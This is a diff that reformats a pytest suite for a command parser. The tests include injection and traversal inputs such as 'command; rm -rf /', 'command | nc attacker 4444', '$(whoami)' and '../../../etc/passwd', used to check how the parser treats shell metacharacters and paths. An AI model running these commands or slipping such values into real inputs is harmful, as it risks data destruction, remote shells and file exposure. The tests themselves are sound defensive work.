@@ -64,10 +64,7 @@ def sample_metadata() -> CommandMetadata:
         name="test",
         description="Test command",
         usage="test <required> [optional]",
-        args=[
-            ArgumentSpec("required", "string", required=True),
-            ArgumentSpec("optional", "string", required=False)
-        ]
+        args=[ArgumentSpec("required", "string", required=True), ArgumentSpec("optional", "string", required=False)],
     )
 
 
@@ -160,7 +157,7 @@ def test_parse_command_handles_quoted_arguments_correctly(parser: ArgumentParser
     quoted strings as single arguments.
     """
     # ARRANGE
-    command_line: str = 'echo "hello world" \'single quotes\''
+    command_line: str = "echo \"hello world\" 'single quotes'"
 
     # ACT
     part1, part2, args = ArgumentParser.parse_command(command_line)
@@ -269,17 +266,18 @@ def test_parse_command_handles_excessively_long_input(parser: ArgumentParser) ->
     assert len(part2) == 10000
 
 
-@pytest.mark.parametrize("malicious_input,expected_part1", [
-    ("command; rm -rf /", "command;"),
-    ("command && malicious", "command"),
-    ("command | nc attacker 4444", "command"),
-    ("command `whoami`", "command"),
-    ("command $(whoami)", "command"),
-])
+@pytest.mark.parametrize(
+    "malicious_input,expected_part1",
+    [
+        ("command; rm -rf /", "command;"),
+        ("command && malicious", "command"),
+        ("command | nc attacker 4444", "command"),
+        ("command `whoami`", "command"),
+        ("command $(whoami)", "command"),
+    ],
+)
 def test_parse_command_preserves_shell_metacharacters(  # CRITICAL TEST
-    parser: ArgumentParser,
-    malicious_input: str,
-    expected_part1: str
+    parser: ArgumentParser, malicious_input: str, expected_part1: str
 ) -> None:
     """
     Test parse_command preserves shell metacharacters without execution.
@@ -305,8 +303,7 @@ def test_parse_command_preserves_shell_metacharacters(  # CRITICAL TEST
 
 
 def test_validate_args_returns_true_when_exact_required_count(
-    parser: ArgumentParser,
-    sample_metadata: CommandMetadata
+    parser: ArgumentParser, sample_metadata: CommandMetadata
 ) -> None:
     """
     Test validate_args returns True when exactly required args provided.
@@ -325,8 +322,7 @@ def test_validate_args_returns_true_when_exact_required_count(
 
 
 def test_validate_args_returns_true_when_all_args_provided(
-    parser: ArgumentParser,
-    sample_metadata: CommandMetadata
+    parser: ArgumentParser, sample_metadata: CommandMetadata
 ) -> None:
     """
     Test validate_args returns True when all args provided.
@@ -345,8 +341,7 @@ def test_validate_args_returns_true_when_all_args_provided(
 
 
 def test_validate_args_returns_false_when_too_few_args(
-    parser: ArgumentParser,
-    sample_metadata: CommandMetadata
+    parser: ArgumentParser, sample_metadata: CommandMetadata
 ) -> None:
     """
     Test validate_args returns False when insufficient args.
@@ -365,8 +360,7 @@ def test_validate_args_returns_false_when_too_few_args(
 
 
 def test_validate_args_returns_false_when_too_many_args(
-    parser: ArgumentParser,
-    sample_metadata: CommandMetadata
+    parser: ArgumentParser, sample_metadata: CommandMetadata
 ) -> None:
     """
     Test validate_args returns False when excess args provided.
@@ -390,8 +384,7 @@ def test_validate_args_returns_false_when_too_many_args(
 
 
 def test_resolve_argument_with_context_uses_provided_arg_when_given(
-    parser: ArgumentParser,
-    context_manager: ContextManager
+    parser: ArgumentParser, context_manager: ContextManager
 ) -> None:
     """
     Test resolve_argument_with_context prefers provided argument.
@@ -404,17 +397,14 @@ def test_resolve_argument_with_context_uses_provided_arg_when_given(
     arg_spec: ArgumentSpec = ArgumentSpec("test", "string", context_key="instance")
 
     # ACT
-    result: Optional[str] = ArgumentParser.resolve_argument_with_context(
-        arg, arg_spec, context_manager
-    )
+    result: Optional[str] = ArgumentParser.resolve_argument_with_context(arg, arg_spec, context_manager)
 
     # ASSERT
     assert result == "provided_value"
 
 
 def test_resolve_argument_with_context_falls_back_to_context(
-    parser: ArgumentParser,
-    context_manager: ContextManager
+    parser: ArgumentParser, context_manager: ContextManager
 ) -> None:
     """
     Test resolve_argument_with_context uses context when no arg.
@@ -427,17 +417,14 @@ def test_resolve_argument_with_context_falls_back_to_context(
     arg_spec: ArgumentSpec = ArgumentSpec("test", "string", context_key="instance")
 
     # ACT
-    result: Optional[str] = ArgumentParser.resolve_argument_with_context(
-        arg, arg_spec, context_manager
-    )
+    result: Optional[str] = ArgumentParser.resolve_argument_with_context(arg, arg_spec, context_manager)
 
     # ASSERT
     assert result == "test_instance"
 
 
 def test_resolve_argument_with_context_raises_when_required_missing(  # CRITICAL TEST
-    parser: ArgumentParser,
-    context_manager: ContextManager
+    parser: ArgumentParser, context_manager: ContextManager
 ) -> None:
     """
     Test resolve_argument_with_context raises for missing required arg.
@@ -455,8 +442,7 @@ def test_resolve_argument_with_context_raises_when_required_missing(  # CRITICAL
 
 
 def test_resolve_argument_with_context_returns_none_when_optional_missing(
-    parser: ArgumentParser,
-    context_manager: ContextManager
+    parser: ArgumentParser, context_manager: ContextManager
 ) -> None:
     """
     Test resolve_argument_with_context returns None for missing optional arg.
@@ -469,9 +455,7 @@ def test_resolve_argument_with_context_returns_none_when_optional_missing(
     arg_spec: ArgumentSpec = ArgumentSpec("test", "string", required=False, context_key="missing")
 
     # ACT
-    result: Optional[str] = ArgumentParser.resolve_argument_with_context(
-        arg, arg_spec, context_manager
-    )
+    result: Optional[str] = ArgumentParser.resolve_argument_with_context(arg, arg_spec, context_manager)
 
     # ASSERT
     assert result is None
@@ -536,15 +520,17 @@ def test_split_compound_argument_handles_multiple_dots(parser: ArgumentParser) -
     assert secondary == "database.table"
 
 
-@pytest.mark.parametrize("traversal_input", [
-    "../../../etc/passwd",
-    "..\\..\\..\\windows\\system32",
-    "legitimate/../../etc/passwd",
-    "./../sensitive/file",
-])
+@pytest.mark.parametrize(
+    "traversal_input",
+    [
+        "../../../etc/passwd",
+        "..\\..\\..\\windows\\system32",
+        "legitimate/../../etc/passwd",
+        "./../sensitive/file",
+    ],
+)
 def test_split_compound_argument_allows_path_traversal_patterns(  # CRITICAL TEST
-    parser: ArgumentParser,
-    traversal_input: str
+    parser: ArgumentParser, traversal_input: str
 ) -> None:
     """
     Test split_compound_argument does NOT validate path traversal.
